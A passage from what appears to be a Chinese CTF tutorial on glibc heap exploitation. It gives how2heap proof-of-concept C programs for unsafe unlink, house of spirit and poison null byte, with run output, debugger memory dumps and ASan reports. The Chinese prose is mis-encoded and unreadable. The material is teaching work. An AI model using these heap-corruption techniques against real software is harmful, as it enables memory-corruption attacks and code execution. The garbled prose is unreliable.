0x602090:   0x0000000000000080  0x0000000000000090  &lt;-- chunk 1 &lt;-- prev_size
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000000000
0x6020c0:   0x0000000000000000  0x0000000000000000
0x6020d0:   0x0000000000000000  0x0000000000000000
0x6020e0:   0x0000000000000000  0x0000000000000000
0x6020f0:   0x0000000000000000  0x0000000000000000
0x602100:   0x0000000000000000  0x0000000000000000
0x602110:   0x0000000000000000  0x0000000000000000
0x602120:   0x0000000000000000  0x0000000000020ee1  &lt;-- top chunk
0x602130:   0x0000000000000000  0x0000000000000000
</code></pre>
<p>è¿™é‡Œæœ‰ä¸‰ç§åŠžæ³•å¯ä»¥ç»•è¿‡è¯¥æ£€æŸ¥ï¼š</p>
<ul>
<li>
<p>ä»€ä¹ˆéƒ½ä¸åšã€‚</p>
</li>
<li>
<p><code>chunksize(P) == chunk0_ptr[1] &amp; (~ 0x7) == 0x0</code></p>
</li>
<li>
<p><code>prev_size (next_chunk(P)) == prev_size (chunk0_ptr + 0x0) == 0x0</code></p>
</li>
<li>
<p>è®¾ç½®</p>
</li>
</ul>
<p><code>chunk0_ptr[1] = 0x8</code></p>
<p>ã€‚</p>
<ul>
<li><code>chunksize(P) == chunk0_ptr[1] &amp; (~ 0x7) == 0x8</code></li>
<li>
<p><code>prev_size (next_chunk(P)) == prev_size (chunk0_ptr + 0x8) == 0x8</code></p>
</li>
<li>
<p>è®¾ç½®</p>
</li>
</ul>
<p><code>chunk0_ptr[1] = 0x80</code></p>
<p>ã€‚</p>
<ul>
<li><code>chunksize(P) == chunk0_ptr[1] &amp; (~ 0x7) == 0x80</code></li>
<li><code>prev_size (next_chunk(P)) == prev_size (chunk0_ptr + 0x80) == 0x80</code></li>
</ul>
<p>å¥½çš„ï¼ŒçŽ°åœ¨ libc-2.25 ç‰ˆæœ¬ä¸‹æˆ‘ä»¬ä¹Ÿèƒ½æˆåŠŸåˆ©ç”¨äº†ã€‚æŽ¥ä¸‹æ¥æ›´è¿‘ä¸€æ­¥ï¼Œlibc-2.26 æ€Žä¹ˆåˆ©ç”¨ï¼Œé¦–å…ˆå½“ç„¶è¦å…ˆçŸ¥é“å®ƒæ–°å¢žäº†å“ªäº›æ¼æ´žç¼“è§£æŽªæ–½ï¼Œå…¶ä¸­ä¸€ä¸ªç¥žå¥‡çš„ä¸œè¥¿å«åš tcacheï¼Œè¿™æ˜¯ä¸€ç§çº¿ç¨‹ç¼“å­˜æœºåˆ¶ï¼Œæ¯ä¸ªçº¿ç¨‹é»˜è®¤æƒ…å†µä¸‹æœ‰ 64 ä¸ªå¤§å°é€’å¢žçš„ binsï¼Œæ¯ä¸ª bin æ˜¯ä¸€ä¸ªå•é“¾è¡¨ï¼Œé»˜è®¤æœ€å¤šåŒ…å« 7 ä¸ª chunkã€‚å…¶ä¸­ç¼“å­˜çš„ chunk æ˜¯ä¸ä¼šè¢«åˆå¹¶çš„ï¼Œæ‰€ä»¥åœ¨é‡Šæ”¾ chunk 1 çš„æ—¶å€™ï¼Œ<code>chunk0_ptr</code> ä»ç„¶æŒ‡å‘æ­£ç¡®çš„å †åœ°å€ï¼Œè€Œä¸æ˜¯ä¹‹å‰çš„ <code>chunk0_ptr = P = P-&gt;fd</code>ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä¸€ç§å¯èƒ½çš„åŠžæ³•æ˜¯ç»™å¡«å……è¿›ç‰¹å®šå¤§å°çš„ chunk æŠŠ bin å æ»¡ï¼Œå°±åƒä¸‹é¢è¿™æ ·ï¼š</p>
<pre><code class="language-c">    // deal with tcache
    int *a[10];
    int i;
    for (i = 0; i &lt; 7; i++) {
        a[i] = malloc(0x80);
    }
    for (i = 0; i &lt; 7; i++) {
        free(a[i]);
    }
gefâž¤  p &amp;chunk0_ptr
$2 = (uint64_t **) 0x555555755070 &lt;chunk0_ptr&gt;
gefâž¤  x/gx 0x555555755070
0x555555755070 &lt;chunk0_ptr&gt;:    0x00007fffffffdd0f
gefâž¤  x/gx 0x00007fffffffdd0f
0x7fffffffdd0f: 0x4242424242424242
</code></pre>
<p>çŽ°åœ¨ libc-2.26 ç‰ˆæœ¬ä¸‹ä¹ŸæˆåŠŸåˆ©ç”¨äº†ã€‚tcache æ˜¯ä¸ªå¾ˆæœ‰è¶£çš„ä¸œè¥¿ï¼Œæ›´è¯¦ç»†çš„å†…å®¹æˆ‘ä»¬ä¼šåœ¨ä¸“é—¨çš„ç« èŠ‚é‡ŒåŽ»è®²ã€‚</p>
<p>åŠ ä¸Šå†…å­˜æ£€æµ‹å‚æ•°é‡æ–°ç¼–è¯‘ï¼Œå¯ä»¥çœ‹åˆ° heap-buffer-overflowï¼š</p>
<pre><code class="language-text">$ gcc -fsanitize=address -g unsafe_unlink.c
$ ./a.out
The global chunk0_ptr is at 0x602230, pointing to 0x60c00000bf80
The victim chunk we are going to corrupt is at 0x60c00000bec0

Fake chunk fd: 0x602218
Fake chunk bk: 0x602220

=================================================================
==5591==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60c00000beb0 at pc 0x000000400d74 bp 0x7ffd06423730 sp 0x7ffd06423720
WRITE of size 8 at 0x60c00000beb0 thread T0
    #0 0x400d73 in main /home/firmy/how2heap/unsafe_unlink.c:26
    #1 0x7fc925d8282f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
    #2 0x400968 in _start (/home/firmy/how2heap/a.out+0x400968)

0x60c00000beb0 is located 16 bytes to the left of 128-byte region [0x60c00000bec0,0x60c00000bf40)
allocated by thread T0 here:
    #0 0x7fc9261c4602 in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98602)
    #1 0x400b12 in main /home/firmy/how2heap/unsafe_unlink.c:13
    #2 0x7fc925d8282f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
</code></pre>
<h3 id="house_of_spirit">house_of_spirit</h3>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main() {
    malloc(1);

    fprintf(stderr, &quot;We will overwrite a pointer to point to a fake 'fastbin' region. This region contains two chunks.\n&quot;);
    unsigned long long *a, *b;
    unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

    fprintf(stderr, &quot;The first one:  %p\n&quot;, &amp;fake_chunks[0]);
    fprintf(stderr, &quot;The second one: %p\n&quot;, &amp;fake_chunks[4]);

    fake_chunks[1] = 0x20;      // the size
    fake_chunks[5] = 0x1234;    // nextsize

    fake_chunks[2] = 0x4141414141414141LL;
    fake_chunks[6] = 0x4141414141414141LL;

    fprintf(stderr, &quot;Overwritting our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;, &amp;fake_chunks[0]);
    a = &amp;fake_chunks[2];

    fprintf(stderr, &quot;Freeing the overwritten pointer.\n&quot;);
    free(a);

    fprintf(stderr, &quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;, &amp;fake_chunks[0], &amp;fake_chunks[2]);
    b = malloc(0x10);
    fprintf(stderr, &quot;malloc(0x10): %p\n&quot;, b);
    b[0] = 0x4242424242424242LL;
}
$ gcc -g house_of_spirit.c
$ ./a.out
We will overwrite a pointer to point to a fake 'fastbin' region. This region contains two chunks.
The first one:  0x7ffc782dae00
The second one: 0x7ffc782dae20
Overwritting our pointer with the address of the fake region inside the fake first chunk, 0x7ffc782dae00.
Freeing the overwritten pointer.
Now the next malloc will return the region of our fake chunk at 0x7ffc782dae00, which will be 0x7ffc782dae10!
malloc(0x10): 0x7ffc782dae10
</code></pre>
<p>house-of-spirit æ˜¯ä¸€ç§ fastbins æ”»å‡»æ–¹æ³•ï¼Œé€šè¿‡æž„é€  fake chunkï¼Œç„¶åŽå°†å…¶ free æŽ‰ï¼Œå°±å¯ä»¥åœ¨ä¸‹ä¸€æ¬¡ malloc æ—¶è¿”å›ž fake chunk çš„åœ°å€ï¼Œå³ä»»æ„æˆ‘ä»¬å¯æŽ§çš„åŒºåŸŸã€‚house-of-spirit æ˜¯ä¸€ç§é€šè¿‡å †çš„ fast bin æœºåˆ¶æ¥è¾…åŠ©æ ˆæº¢å‡ºçš„æ–¹æ³•ï¼Œä¸€èˆ¬çš„æ ˆæº¢å‡ºæ¼æ´žçš„åˆ©ç”¨éƒ½å¸Œæœ›èƒ½å¤Ÿè¦†ç›–å‡½æ•°çš„è¿”å›žåœ°å€ä»¥æŽ§åˆ¶ EIP æ¥åŠ«æŒæŽ§åˆ¶æµï¼Œä½†å¦‚æžœæ ˆæº¢å‡ºçš„é•¿åº¦æ— æ³•è¦†ç›–è¿”å›žåœ°å€ï¼ŒåŒæ—¶å´å¯ä»¥è¦†ç›–æ ˆä¸Šçš„ä¸€ä¸ªå³å°†è¢« free çš„å †æŒ‡é’ˆï¼Œæ­¤æ—¶å¯ä»¥å°†è¿™ä¸ªæŒ‡é’ˆæ”¹å†™ä¸ºæ ˆä¸Šçš„åœ°å€å¹¶åœ¨ç›¸åº”ä½ç½®æž„é€ ä¸€ä¸ª fast bin å—çš„å…ƒæ•°æ®ï¼ŒæŽ¥ç€åœ¨ free æ“ä½œæ—¶ï¼Œè¿™ä¸ªæ ˆä¸Šçš„å †å—è¢«æ”¾åˆ° fast bin ä¸­ï¼Œä¸‹ä¸€æ¬¡ malloc å¯¹åº”çš„å¤§å°æ—¶ï¼Œç”±äºŽ fast bin çš„å…ˆè¿›åŽå‡ºæœºåˆ¶ï¼Œè¿™ä¸ªæ ˆä¸Šçš„å †å—è¢«è¿”å›žç»™ç”¨æˆ·ï¼Œå†æ¬¡å†™å…¥æ—¶å°±å¯èƒ½é€ æˆè¿”å›žåœ°å€çš„æ”¹å†™ã€‚æ‰€ä»¥åˆ©ç”¨çš„ç¬¬ä¸€æ­¥ä¸æ˜¯åŽ»æŽ§åˆ¶ä¸€ä¸ª chunkï¼Œè€Œæ˜¯æŽ§åˆ¶ä¼ ç»™ free å‡½æ•°çš„æŒ‡é’ˆï¼Œå°†å…¶æŒ‡å‘ä¸€ä¸ª fake chunkã€‚æ‰€ä»¥ fake chunk çš„ä¼ªé€ æ˜¯å…³é”®ã€‚</p>
<p>é¦–å…ˆ malloc(1) ç”¨äºŽåˆå§‹åŒ–å†…å­˜çŽ¯å¢ƒï¼Œç„¶åŽåœ¨ fake chunk åŒºåŸŸä¼ªé€ å‡ºä¸¤ä¸ª chunkã€‚å¦å¤–æ­£å¦‚ä¸Šé¢æ‰€è¯´çš„ï¼Œéœ€è¦ä¸€ä¸ªä¼ é€’ç»™ free å‡½æ•°çš„å¯ä»¥è¢«ä¿®æ”¹çš„æŒ‡é’ˆï¼Œæ— è®ºæ˜¯é€šè¿‡æ ˆæº¢å‡ºè¿˜æ˜¯å…¶å®ƒä»€ä¹ˆæ–¹å¼ï¼š</p>
<pre><code class="language-text">gefâž¤  x/10gx &amp;fake_chunks
0x7fffffffdcb0: 0x0000000000000000  0x0000000000000020  &lt;-- fake chunk 1
0x7fffffffdcc0: 0x4141414141414141  0x0000000000000000
0x7fffffffdcd0: 0x0000000000000001  0x0000000000001234  &lt;-- fake chunk 2
0x7fffffffdce0: 0x4141414141414141  0x0000000000000000
gefâž¤  x/gx &amp;a
0x7fffffffdca0: 0x0000000000000000
</code></pre>
<p>ä¼ªé€  chunk æ—¶éœ€è¦ç»•è¿‡ä¸€äº›æ£€æŸ¥ï¼Œé¦–å…ˆæ˜¯æ ‡å¿—ä½ï¼Œ<code>PREV_INUSE</code> ä½å¹¶ä¸å½±å“ free çš„è¿‡ç¨‹ï¼Œä½† <code>IS_MMAPPED</code> ä½å’Œ <code>NON_MAIN_ARENA</code> ä½éƒ½è¦ä¸ºé›¶ã€‚å…¶æ¬¡ï¼Œåœ¨ 64 ä½ç³»ç»Ÿä¸­ fast chunk çš„å¤§å°è¦åœ¨ 32~128 å­—èŠ‚ä¹‹é—´ã€‚æœ€åŽï¼Œæ˜¯ next chunk çš„å¤§å°ï¼Œå¿…é¡»å¤§äºŽ <code>2*SIZE_SZ</code>ï¼ˆå³å¤§äºŽ16ï¼‰ï¼Œå°äºŽ <code>av-&gt;system_mem</code>ï¼ˆå³å°äºŽ128kbï¼‰ï¼Œæ‰èƒ½ç»•è¿‡å¯¹ next chunk å¤§å°çš„æ£€æŸ¥ã€‚</p>
<p>libc-2.23 ä¸­è¿™äº›æ£€æŸ¥ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="language-c">void
__libc_free (void *mem)
{
  mstate ar_ptr;
  mchunkptr p;                          /* chunk corresponding to mem */

  [...]
  p = mem2chunk (mem);

  if (chunk_is_mmapped (p))                       /* release mmapped memory. */
    {
      [...]
      munmap_chunk (p);
      return;
    }

  ar_ptr = arena_for_chunk (p);     // èŽ·å¾— chunk æ‰€å±ž arena çš„åœ°å€
  _int_free (ar_ptr, p, 0);         // å½“ IS_MMAPPED ä¸ºé›¶æ—¶è°ƒç”¨
}
</code></pre>
<p><code>mem</code> å°±æ˜¯æˆ‘ä»¬æ‰€æŽ§åˆ¶çš„ä¼ é€’ç»™ free å‡½æ•°çš„åœ°å€ã€‚å…¶ä¸­ä¸‹é¢ä¸¤ä¸ªå‡½æ•°ç”¨äºŽåœ¨ chunk æŒ‡é’ˆå’Œ malloc æŒ‡é’ˆä¹‹é—´åšè½¬æ¢ï¼š</p>
<pre><code class="language-c">/* conversion from malloc headers to user pointers, and back */

#define chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))
#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))
</code></pre>
<p>å½“ <code>NON_MAIN_ARENA</code> ä¸ºé›¶æ—¶è¿”å›ž main arenaï¼š</p>
<pre><code class="language-c">/* find the heap and corresponding arena for a given ptr */

#define heap_for_ptr(ptr) \
  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))
#define arena_for_chunk(ptr) \
  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)
</code></pre>
<p>è¿™æ ·ï¼Œç¨‹åºå°±é¡ºåˆ©åœ°è¿›å…¥äº† <code>_int_free</code> å‡½æ•°ï¼š</p>
<pre><code class="language-c">static void
_int_free (mstate av, mchunkptr p, int have_lock)
{
  INTERNAL_SIZE_T size;        /* its size */
  mfastbinptr *fb;             /* associated fastbin */

  [...]
  size = chunksize (p);

  [...]
  /*
    If eligible, place chunk on a fastbin so it can be found
    and used quickly in malloc.
  */

  if ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ())

#if TRIM_FASTBINS
      /*
    If TRIM_FASTBINS set, don't place chunks
    bordering top into fastbins
      */
      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)
#endif
      ) {

    if (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= 2 * SIZE_SZ, 0)
    || __builtin_expect (chunksize (chunk_at_offset (p, size))
                 &gt;= av-&gt;system_mem, 0))
      {
        [...]
        errstr = &quot;free(): invalid next size (fast)&quot;;
        goto errout;
      }

    [...]
    set_fastchunks(av);
    unsigned int idx = fastbin_index(size);
    fb = &amp;fastbin (av, idx);

    /* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */
    mchunkptr old = *fb, old2;
    [...]
    do
      {
    [...]
    p-&gt;fd = old2 = old;
      }
    while ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);
</code></pre>
<p>å…¶ä¸­ä¸‹é¢çš„å®å‡½æ•°ç”¨äºŽèŽ·å¾— next chunkï¼š</p>
<pre><code class="language-c">/* Treat space at ptr + offset as a chunk */
#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))
</code></pre>
<p>ç„¶åŽä¿®æ”¹æŒ‡é’ˆ a æŒ‡å‘ (fake chunk 1 + 0x10) çš„ä½ç½®ï¼Œå³ä¸Šé¢æåˆ°çš„ <code>mem</code>ã€‚ç„¶åŽå°†å…¶ä¼ é€’ç»™ free å‡½æ•°ï¼Œè¿™æ—¶ç¨‹åºå°±ä¼šè¯¯ä»¥ä¸ºè¿™æ˜¯ä¸€å—çœŸçš„ chunkï¼Œç„¶åŽå°†å…¶é‡Šæ”¾å¹¶åŠ å…¥åˆ° fastbin ä¸­ã€‚</p>
<pre><code class="language-text">gefâž¤  x/gx &amp;a
0x7fffffffdca0: 0x00007fffffffdcc0
gefâž¤  x/10gx &amp;fake_chunks
0x7fffffffdcb0: 0x0000000000000000  0x0000000000000020  &lt;-- fake chunk 1 [be freed]
0x7fffffffdcc0: 0x0000000000000000  0x0000000000000000
0x7fffffffdcd0: 0x0000000000000001  0x0000000000001234  &lt;-- fake chunk 2
0x7fffffffdce0: 0x4141414141414141  0x0000000000000000
0x7fffffffdcf0: 0x0000000000400820  0x00000000004005b0
gefâž¤  heap bins fast
[ Fastbins for arena 0x7ffff7dd1b20 ]
Fastbins[idx=0, size=0x10]  â†  Chunk(addr=0x7fffffffdcc0, size=0x20, flags=)
</code></pre>
<p>è¿™æ—¶å¦‚æžœæˆ‘ä»¬ malloc ä¸€ä¸ªå¯¹åº”å¤§å°çš„ fast chunkï¼Œç¨‹åºå°†ä»Ž fastbins ä¸­åˆ†é…å‡ºè¿™å—è¢«é‡Šæ”¾çš„ chunkã€‚</p>
<pre><code class="language-text">gefâž¤  x/10gx &amp;fake_chunks
0x7fffffffdcb0: 0x0000000000000000  0x0000000000000020  &lt;-- new chunk
0x7fffffffdcc0: 0x4242424242424242  0x0000000000000000
0x7fffffffdcd0: 0x0000000000000001  0x0000000000001234  &lt;-- fake chunk 2
0x7fffffffdce0: 0x4141414141414141  0x0000000000000000
0x7fffffffdcf0: 0x0000000000400820  0x00000000004005b0
gefâž¤  x/gx &amp;b
0x7fffffffdca8: 0x00007fffffffdcc0
</code></pre>
<p>æ‰€ä»¥ house-of-spirit çš„ä¸»è¦ç›®çš„æ˜¯ï¼Œå½“æˆ‘ä»¬ä¼ªé€ çš„ fake chunk å†…éƒ¨å­˜åœ¨ä¸å¯æŽ§åŒºåŸŸæ—¶ï¼Œè¿ç”¨è¿™ä¸€æŠ€æœ¯å¯ä»¥å°†è¿™ç‰‡åŒºåŸŸå˜æˆå¯æŽ§çš„ã€‚ä¸Šé¢ä¸ºäº†æ–¹ä¾¿è§‚å¯Ÿï¼Œåœ¨ fake chunk é‡Œå¡«å……ä¸€äº›å­—æ¯ï¼Œä½†åœ¨çŽ°å®žä¸­è¿™äº›ä½ç½®å¾ˆå¯èƒ½æ˜¯ä¸å¯æŽ§çš„ï¼Œè€Œ house-of-spirit ä¹Ÿæ­£æ˜¯ä»¥æ­¤ä¸ºç›®çš„è€Œå‡ºçŽ°çš„ã€‚</p>
<p>è¯¥æŠ€æœ¯çš„ç¼ºç‚¹ä¹Ÿæ˜¯éœ€è¦å¯¹æ ˆåœ°å€è¿›è¡Œæ³„æ¼ï¼Œå¦åˆ™æ— æ³•æ­£ç¡®è¦†ç›–éœ€è¦é‡Šæ”¾çš„å †æŒ‡é’ˆï¼Œä¸”åœ¨æž„é€ æ•°æ®æ—¶ï¼Œéœ€è¦æ»¡è¶³å¯¹é½çš„è¦æ±‚ç­‰ã€‚</p>
<p>åŠ ä¸Šå†…å­˜æ£€æµ‹å‚æ•°é‡æ–°ç¼–è¯‘ï¼Œå¯ä»¥çœ‹åˆ°é—®é¢˜æ‰€åœ¨ï¼Œå³å°è¯• free ä¸€å—ä¸æ˜¯ç”± malloc åˆ†é…çš„ chunkï¼š</p>
<pre><code class="language-text">$ gcc -fsanitize=address -g house_of_spirit.c
$ ./a.out
We will overwrite a pointer to point to a fake 'fastbin' region. This region contains two chunks.
The first one:  0x7fffa61d6c00
The second one: 0x7fffa61d6c20
Overwritting our pointer with the address of the fake region inside the fake first chunk, 0x7fffa61d6c00.
Freeing the overwritten pointer.
=================================================================
==5282==ERROR: AddressSanitizer: attempting free on address which was not malloc()-ed: 0x7fffa61d6c10 in thread T0
    #0 0x7fc4c3a332ca in __interceptor_free (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x982ca)
    #1 0x400cab in main /home/firmyy/how2heap/house_of_spirit.c:24
    #2 0x7fc4c35f182f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
    #3 0x4009b8 in _start (/home/firmyy/how2heap/a.out+0x4009b8)
</code></pre>
<p>house-of-spirit åœ¨ libc-2.26 ä¸‹çš„åˆ©ç”¨å¯ä»¥æŸ¥çœ‹ç« èŠ‚ 4.14ã€‚</p>
<h2 id="317-linux">3.1.7 Linux å †åˆ©ç”¨ï¼ˆä¸­ï¼‰</h2>
<ul>
<li>how2heap</li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.7_heap_exploit_2.html#poison_null_byte">poison_null_byte</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.7_heap_exploit_2.html#house_of_lore">house_of_lore</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.7_heap_exploit_2.html#overlapping_chunks">overlapping_chunks</a></li>
<li><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.7_heap_exploit_2.html#overlapping_chunks_2">overlapping_chunks_2</a></li>
</ul>
<p><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/src/Others/3.1.6_heap_exploit">ä¸‹è½½æ–‡ä»¶</a></p>
<h2 id="how2heap_1">how2heap</h2>
<h3 id="poison_null_byte">poison_null_byte</h3>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;malloc.h&gt;

int main() {
    uint8_t *a, *b, *c, *b1, *b2, *d;

    a = (uint8_t*) malloc(0x10);
    int real_a_size = malloc_usable_size(a);
    fprintf(stderr, &quot;We allocate 0x10 bytes for 'a': %p\n&quot;, a);
    fprintf(stderr, &quot;'real' size of 'a': %#x\n&quot;, real_a_size);

    b = (uint8_t*) malloc(0x100);
    c = (uint8_t*) malloc(0x80);
    fprintf(stderr, &quot;b: %p\n&quot;, b);
    fprintf(stderr, &quot;c: %p\n&quot;, c);

    uint64_t* b_size_ptr = (uint64_t*)(b - 0x8);
    *(size_t*)(b+0xf0) = 0x100;
    fprintf(stderr, &quot;b.size: %#lx ((0x100 + 0x10) | prev_in_use)\n\n&quot;, *b_size_ptr);

    // deal with tcache
    // int *k[10], i;
    // for (i = 0; i &lt; 7; i++) {
    //     k[i] = malloc(0x100);
    // }
    // for (i = 0; i &lt; 7; i++) {
    //     free(k[i]);
    // }
    free(b);
    uint64_t* c_prev_size_ptr = ((uint64_t*)c) - 2;
    fprintf(stderr, &quot;After free(b), c.prev_size: %#lx\n&quot;, *c_prev_size_ptr);

    a[real_a_size] = 0; // &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;
    fprintf(stderr, &quot;We overflow 'a' with a single null byte into the metadata of 'b'\n&quot;);
    fprintf(stderr, &quot;b.size: %#lx\n\n&quot;, *b_size_ptr);

    fprintf(stderr, &quot;Pass the check: chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;, *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
    b1 = malloc(0x80);
    memset(b1, 'A', 0x80);
    fprintf(stderr, &quot;We malloc 'b1': %p\n&quot;, b1);
    fprintf(stderr, &quot;c.prev_size: %#lx\n&quot;, *c_prev_size_ptr);
    fprintf(stderr, &quot;fake c.prev_size: %#lx\n\n&quot;, *(((uint64_t*)c)-4));

    b2 = malloc(0x40);
    memset(b2, 'A', 0x40);
    fprintf(stderr, &quot;We malloc 'b2', our 'victim' chunk: %p\n&quot;, b2);

    // deal with tcache
    // for (i = 0; i &lt; 7; i++) {
    //     k[i] = malloc(0x80);
    // }
    // for (i = 0; i &lt; 7; i++) {
    //     free(k[i]);
    // }
    free(b1);
    free(c);
    fprintf(stderr, &quot;Now we free 'b1' and 'c', this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n&quot;);

    d = malloc(0x110);
    fprintf(stderr, &quot;Finally, we allocate 'd', overlapping 'b2': %p\n\n&quot;, d);

    fprintf(stderr, &quot;b2 content:%s\n&quot;, b2);
    memset(d, 'B', 0xb0);
    fprintf(stderr, &quot;New b2 content:%s\n&quot;, b2);
}
$ gcc -g poison_null_byte.c
$ ./a.out
We allocate 0x10 bytes for 'a': 0xabb010
'real' size of 'a': 0x18
b: 0xabb030
c: 0xabb140
b.size: 0x111 ((0x100 + 0x10) | prev_in_use)

After free(b), c.prev_size: 0x110
We overflow 'a' with a single null byte into the metadata of 'b'
b.size: 0x100

Pass the check: chunksize(P) == 0x100 == 0x100 == prev_size (next_chunk(P))
We malloc 'b1': 0xabb030
c.prev_size: 0x110
fake c.prev_size: 0x70

We malloc 'b2', our 'victim' chunk: 0xabb0c0
Now we free 'b1' and 'c', this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').
Finally, we allocate 'd', overlapping 'b2': 0xabb030

b2 content:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
New b2 content:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</code></pre>
<p>è¯¥æŠ€æœ¯é€‚ç”¨çš„åœºæ™¯éœ€è¦æŸä¸ª malloc çš„å†…å­˜åŒºåŸŸå­˜åœ¨ä¸€ä¸ªå•å­—èŠ‚æº¢å‡ºæ¼æ´žã€‚é€šè¿‡æº¢å‡ºä¸‹ä¸€ä¸ª chunk çš„ size å­—æ®µï¼Œæ”»å‡»è€…èƒ½å¤Ÿåœ¨å †ä¸­åˆ›é€ å‡ºé‡å çš„å†…å­˜å—ï¼Œä»Žè€Œè¾¾åˆ°æ”¹å†™å…¶ä»–æ•°æ®çš„ç›®çš„ã€‚å†ç»“åˆå…¶ä»–çš„åˆ©ç”¨æ–¹å¼ï¼ŒåŒæ ·èƒ½å¤ŸèŽ·å¾—ç¨‹åºçš„æŽ§åˆ¶æƒã€‚</p>
<p>å¯¹äºŽå•å­—èŠ‚æº¢å‡ºçš„åˆ©ç”¨æœ‰ä¸‹é¢å‡ ç§ï¼š</p>
<ul>
<li>æ‰©å±•è¢«é‡Šæ”¾å—ï¼šå½“æº¢å‡ºå—çš„ä¸‹ä¸€å—ä¸ºè¢«é‡Šæ”¾å—ä¸”å¤„äºŽ unsorted bin ä¸­ï¼Œåˆ™é€šè¿‡æº¢å‡ºä¸€ä¸ªå­—èŠ‚æ¥å°†å…¶å¤§å°æ‰©å¤§ï¼Œä¸‹æ¬¡å–å¾—æ¬¡å—æ—¶å°±æ„å‘³ç€å…¶åŽçš„å—å°†è¢«è¦†ç›–è€Œé€ æˆè¿›ä¸€æ­¥çš„æº¢å‡º</li>
</ul>
<pre><code class="language-text">  0x100   0x100    0x80
|-------|-------|-------|
|   A   |   B   |   C   |   åˆå§‹çŠ¶æ€
|-------|-------|-------|
|   A   |   B   |   C   |   é‡Šæ”¾ B
|-------|-------|-------|
|   A   |   B   |   C   |   æº¢å‡º B çš„ size ä¸º 0x180
|-------|-------|-------|
|   A   |   B   |   C   |   malloc(0x180-8)
|-------|-------|-------|   C å—è¢«è¦†ç›–
        |&lt;--å®žé™…å¾—åˆ°çš„å—-&gt;|
</code></pre>
<ul>
<li>æ‰©å±•å·²åˆ†é…å—ï¼šå½“æº¢å‡ºå—çš„ä¸‹ä¸€å—ä¸ºä½¿ç”¨ä¸­çš„å—ï¼Œåˆ™éœ€è¦åˆç†æŽ§åˆ¶æº¢å‡ºçš„å­—èŠ‚ï¼Œä½¿å…¶è¢«é‡Šæ”¾æ—¶çš„åˆå¹¶æ“ä½œèƒ½å¤Ÿé¡ºåˆ©è¿›è¡Œï¼Œä¾‹å¦‚ç›´æŽ¥åŠ ä¸Šä¸‹ä¸€å—çš„å¤§å°ä½¿å…¶å®Œå…¨è¢«è¦†ç›–ã€‚ä¸‹ä¸€æ¬¡åˆ†é…å¯¹åº”å¤§å°æ—¶ï¼Œå³å¯å–å¾—å·²ç»è¢«æ‰©å¤§çš„å—ï¼Œå¹¶é€ æˆè¿›ä¸€æ­¥æº¢å‡º</li>
</ul>
<pre><code class="language-text">  0x100   0x100    0x80
|-------|-------|-------|
|   A   |   B   |   C   |   åˆå§‹çŠ¶æ€
|-------|-------|-------|
|   A   |   B   |   C   |   æº¢å‡º B çš„ size ä¸º 0x180
|-------|-------|-------|
|   A   |   B   |   C   |   é‡Šæ”¾ B
|-------|-------|-------|
|   A   |   B   |   C   |   malloc(0x180-8)
|-------|-------|-------|   C å—è¢«è¦†ç›–
        |&lt;--å®žé™…å¾—åˆ°çš„å—-&gt;|
</code></pre>
<ul>
<li>æ”¶ç¼©è¢«é‡Šæ”¾å—ï¼šæ­¤æƒ…å†µé’ˆå¯¹æº¢å‡ºçš„å­—èŠ‚åªèƒ½ä¸º 0 çš„æ—¶å€™ï¼Œä¹Ÿå°±æ˜¯æœ¬èŠ‚æ‰€è¯´çš„ poison-null-byteï¼Œæ­¤æ—¶å°†ä¸‹ä¸€ä¸ªè¢«é‡Šæ”¾çš„å—å¤§å°ç¼©å°ï¼Œå¦‚æ­¤ä¸€æ¥åœ¨ä¹‹åŽåˆ†è£‚æ­¤å—æ—¶å°†æ— æ³•æ­£ç¡®æ›´æ–°åŽä¸€å—çš„ prev_size å­—æ®µï¼Œå¯¼è‡´é‡Šæ”¾æ—¶å‡ºçŽ°é‡å çš„å †å—</li>
</ul>
<pre><code class="language-text">  0x100     0x210     0x80
|-------|---------------|-------|
